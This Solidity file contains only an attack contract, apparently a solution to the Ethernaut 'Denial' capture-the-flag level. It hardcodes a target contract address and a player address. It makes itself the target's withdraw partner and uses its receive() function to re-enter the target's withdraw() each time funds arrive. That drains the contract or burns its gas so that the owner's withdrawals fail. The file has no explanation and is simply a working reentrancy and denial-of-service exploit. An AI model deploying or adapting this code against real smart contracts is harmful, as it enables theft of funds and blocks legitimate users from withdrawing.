// SPDX-License-Identifier: MIT
pragma solidity ^0.8.*;

contract Denial {

    address target = 0xedc42AD5d740D3d61AbbB08D4d2979145a63755B;
    address player = 0xD64D08C68F6940281c51108734B5b5DA95f62BD5;
    event TestBool(bool);
    event TestUint(uint256);

    function setPartner() public {

        bytes memory payload = abi.encodeWithSignature("setWithdrawPartner(address)", address(this));
        (bool success, ) = target.call(payload);
        emit TestBool(success);
    }

    receive() external payable {

        bytes memory payload = abi.encodeWithSignature("withdraw()");
        (bool success, ) = target.call(payload);
        emit TestBool(success);
    }
}